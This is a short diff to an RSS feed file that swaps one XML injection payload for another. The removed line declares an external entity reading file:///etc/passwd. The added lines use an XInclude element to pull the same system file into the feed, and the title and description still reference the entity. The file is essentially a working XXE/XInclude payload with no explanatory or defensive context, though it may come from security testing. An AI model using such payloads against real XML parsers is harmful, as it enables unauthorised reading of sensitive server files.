@@ -1,6 +1,7 @@
 <?xml version="1.0" encoding="windows-1252"?>
 <rss version="2.0">
-  <!DOCTYPE channel [ <!ENTITY file SYSTEM "file:///etc/passwd"> ]>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo> 
   <channel>
     <title>&file;</title>
     <description>&file;</description>
